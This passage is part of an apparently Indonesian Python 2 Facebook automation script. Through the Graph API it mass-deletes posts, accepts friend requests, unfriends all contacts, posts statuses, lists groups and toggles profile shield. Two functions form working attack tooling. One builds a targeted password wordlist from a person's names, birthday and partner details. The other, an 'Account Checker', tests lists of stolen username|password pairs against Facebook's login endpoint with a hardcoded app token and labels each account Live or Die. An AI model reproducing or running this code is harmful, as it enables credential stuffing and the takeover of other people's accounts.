		lol = json.loads(nam.text)
		nama = lol['name']
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%nama)
	jalan("\033[1;91m[+] \033[1;92mStart\033[1;97m ...")
	print 42*"\033[1;97m═"
	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+toket)
	asus = json.loads(asu.text)
	for p in asus['data']:
		id = p['id']
		piro = 0
		url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+toket)
		ok = json.loads(url.text)
		try:
			error = ok['error']['message']
			print '\033[1;91m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;91m] \033[1;95mFailed'
		except TypeError:
			print '\033[1;92m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;92m] \033[1;96mDeleted'
			piro += 1
		except requests.exceptions.ConnectionError:
			print"\033[1;91m[!] Connection Error"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu_bot()
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()
	
##### ACCEPT FRIEND #####
def accept():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+toket)
	teman = json.loads(r.text)
	if '[]' in str(teman['data']):
		print"\033[1;91m[!] No friend request"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for i in teman['data']:
		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+toket)
		a = json.loads(gas.text)
		if 'error' in str(a):
			print "\033[1;97m[ \033[1;91mFailed\033[1;97m ] "+i['from']['name']
		else:
			print "\033[1;97m[ \033[1;92mAccept\033[1;97m ] "+i['from']['name']
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()
	
##### UNFRIEND ####
def unfriend():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print "\033[1;97mStop \033[1;91mCTRL+C"
	print 42*"\033[1;97m═"
	try:
		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		cok = json.loads(pek.text)
		for i in cok['data']:
			nama = i['name']
			id = i['id']
			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+toket)
			print "\033[1;97m[\033[1;92m Deleted \033[1;97m] "+nama
	except IndexError: pass
	except KeyboardInterrupt:
		print "\033[1;91m[!] Stopped"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	print"\n\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()
	
#### LAIN LAIN #####
#                                    #
####MENU LAIN#####
def lain():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;94m────────────────────────────────────────────────"
	print "\033[1;97m{\033[1;91m01\033[1;97m}\033[1;93m Buat Post"
	print "\033[1;97m{\033[1;91m02\033[1;97m}\033[1;93m Buat Wordlist"
	print "\033[1;97m{\033[1;91m03\033[1;97m}\033[1;93m Account Checker"
	print "\033[1;97m{\033[1;91m04\033[1;97m}\033[1;93m See my group list"
	print "\033[1;97m{\033[1;91m05\033[1;97m}\033[1;93m Profile Guard"
	print "\033[1;97m{\033[1;91m00\033[1;97m}\033[1;93m Keluar"
	print "\033[1;94m────────────────────────────────────────────────"
	pilih_lain()
#////////////
def pilih_lain():
	other = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if other =="":
		print "\033[1;91m[!] salah"
		pilih_lain()
	elif other =="1":
		status()
	elif other =="2":
		wordlist()
	elif other =="3":
		check_akun()
	elif other =="4":
		grupsaya()
	elif other =="5":
		guard()
	elif other =="0":
		menu()
	else:
		print "\033[1;91m[!] salah"
		pilih_lain()
		
##### STATUS #####
def status():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	msg=raw_input('\033[1;91m[+] \033[1;92mType status \033[1;91m:\033[1;97m ')
	if msg == "":
		print "\033[1;91m[!] tidak bolh kosong"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		lain()
	else:
		res = requests.get("https://graph.facebook.com/me/feed?method=POST&message="+msg+"&access_token="+toket)
		op = json.loads(res.text)
		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		print 42*"\033[1;97m═"
		print"\033[1;91m[+] \033[1;92mStatus ID\033[1;91m : \033[1;97m"+op['id']
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		lain()
		
########### CREATE WORDLIST ##########
def wordlist():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.system('reset')
		print logo
		print "\033[1;91m[?] \033[1;92mIsikan data lengkap target di bawah ini"
		print 42*"\033[1;97m═"
		a = raw_input("\033[1;91m[+] \033[1;92mNama Depan \033[1;97m: ")
		file = open(a+".txt", 'w')
		b=raw_input("\033[1;91m[+] \033[1;92mNama Tengah \033[1;97m: ")
		c=raw_input("\033[1;91m[+] \033[1;92mNama Belakang \033[1;97m: ")
		d=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan \033[1;97m: ")
		e=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir >\033[1;96mex: |XNXX| \033[1;97m: ")
		f=e[0:2]
		g=e[2:4]
		h=e[4:]
		print 42*"\033[1;97m═"
		print("\033[1;91m[?] \033[1;93mKalo Jomblo SKIP aja :v")
		i=raw_input("\033[1;91m[+] \033[1;92mNama Pacar \033[1;97m: ")
		j=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan Pacar \033[1;97m: ")
		k=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir Pacar >\033[1;96mex: |XNXX| \033[1;97m: ")
		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		l=k[0:2]
		m=k[2:4]
		n=k[4:]
		file.write("%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % (a,c,a,b,b,a,b,c,c,a,c,b,a,a,b,b,c,c,a,d,b,d,c,d,d,d,d,a,d,b,d,c,a,e,a,f,a,g,a,h,b,e,b,f,b,g,b,h,c,e,c,f,c,g,c,h,d,e,d,f,d,g,d,h,e,a,f,a,g,a,h,a,e,b,f,b,g,b,h,b,e,c,f,c,g,c,h,c,e,d,f,d,g,d,h,d,d,d,a,f,g,a,g,h,f,g,f,h,f,f,g,f,g,h,g,g,h,f,h,g,h,h,h,g,f,a,g,h,b,f,g,b,g,h,c,f,g,c,g,h,d,f,g,d,g,h,a,i,a,j,a,k,i,e,i,j,i,k,b,i,b,j,b,k,c,i,c,j,c,k,e,k,j,a,j,b,j,c,j,d,j,j,k,a,k,b,k,c,k,d,k,k,i,l,i,m,i,n,j,l,j,m,j,n,j,k))
		wg = 0
		while (wg < 100):
			wg = wg + 1
			file.write(a + str(wg) + '\n')
		en = 0
		while (en < 100):
			en = en + 1
			file.write(i + str(en) + '\n')
		word = 0
		while (word < 100):
			word = word + 1
			file.write(d + str(word) + '\n')
		gen = 0
		while (gen < 100):
			gen = gen + 1
			file.write(j + str(gen) + '\n')
		file.close()
		time.sleep(1.5)
		print 42*"\033[1;97m═"
		print ("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97m %s.txt" %a)
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		lain()
	except IOError, e:
		print("\033[1;91m[!] Gagal")
		raw_input("\n\033[1;91m[ \033[1;97mKeluar\033[1;91m]")
		lain()

##### CHECKER #####
def check_akun():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;91m[?] \033[1;92mCreate in file\033[1;91m : \033[1;97musername|password"
	print 42*"\033[1;97m═"
	live = []
	cek = []
	die = []
	try:
		file = raw_input("\033[1;91m[+] \033[1;92mFile \033[1;91m:\033[1;97m ")
		list = open(file,'r').readlines()
	except IOError:
		print ("\033[1;91m[!] File tidak ada")
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		lain()
	pemisah = raw_input("\033[1;91m[+] \033[1;92mSeparator \033[1;91m:\033[1;97m ")
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for meki in list:
		username, password = (meki.strip()).split(str(pemisah))
		url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(password)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		data = requests.get(url)
		mpsh = json.loads(data.text)
		if 'access_token' in mpsh:
			live.append(password)
			print"\033[1;97m[ \033[1;92mLive\033[1;97m ] \033[1;97m"+username+"|"+password
		elif 'www.facebook.com' in mpsh["error_msg"]:
			cek.append(password)
			print"\033[1;97m[ \033[1;93mCheck\033[1;97m ] \033[1;97m"+username+"|"+password
		else:
			die.append(password)
			print"\033[1;97m[ \033[1;91mDie\033[1;97m ] \033[1;97m"+username+"|"+password
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mTotal\033[1;91m : \033[1;97mLive=\033[1;92m"+str(len(live))+" \033[1;97mCheck=\033[1;93m"+str(len(cek))+" \033[1;97mDie=\033[1;91m"+str(len(die))
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	lain()
	
##### GRUP SAYA #####
def grupsaya():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads(uh.text)
		for p in gud['data']:
			nama = p["name"]
			id = p["id"]
			f=open('out/Grupid.txt','w')
			listgrup.append(id)
			f.write(id + '\n')
			print "\033[1;97m[ \033[1;92mMy Group\033[1;97m ] "+str(id)+" => "+str(nama)
		print 42*"\033[1;97m═"
		print"\033[1;91m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
		print("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97mout/Grupid.txt")
		f.close()
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		lain()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Berhenti")
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		lain()
	except KeyError:
		os.remove('out/Grupid.txt')
		print('\033[1;91m[!] Group tidak ada')
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		lain()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] Tidak ada koneksi"
		keluar()
	except IOError:
		print "\033[1;91m[!] Error"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		lain()
		
##### PROFIL GUARD #####
def guard():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;94m────────────────────────────────────────────────"
	print "\033[1;97m{\033[1;94m01\033[1;97m}\033[1;97m Activate"
	print "\033[1;97m{\033[1;94m02\033[1;97m}\033[1;97m Not activate"
	print "\033[1;97m{\033[1;94m00\033[1;97m}\033[1;91m Keluar"
	print "\033[1;94m────────────────────────────────────────────────"
	g = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if g == "1":
		aktif = "true"
		gaz(toket, aktif)
	elif g == "2":
		non = "false"
		gaz(toket, non)
	elif g =="0":
		lain()
	elif g =="":
		keluar()
	else:
		keluar()
	
def get_userid(toket):
	url = "https://graph.facebook.com/me?access_token=%s"%toket
	res = requests.get(url)
	uid = json.loads(res.text)
	return uid["id"]
		
def gaz(toket, enable = True):
	id = get_userid(toket)
	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % toket}
	url = "https://graph.facebook.com/graphql"
	res = requests.post(url, data = data, headers = headers)
	print(res.text)
	if '"is_shielded":true' in res.text:
		os.system('reset')
		print logo
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mActivate"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	elif '"is_shielded":false' in res.text:
		os.system('reset')
		print logo
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;91mTidak aktif"
		raw_input("\n\033[1;91m[ \033[1;97mKeluar \033[1;91m]")
		lain()
	else:
		print "\033[1;91m[!] Error"
		keluar()
	
if __name__=='__main__':
        sayang()
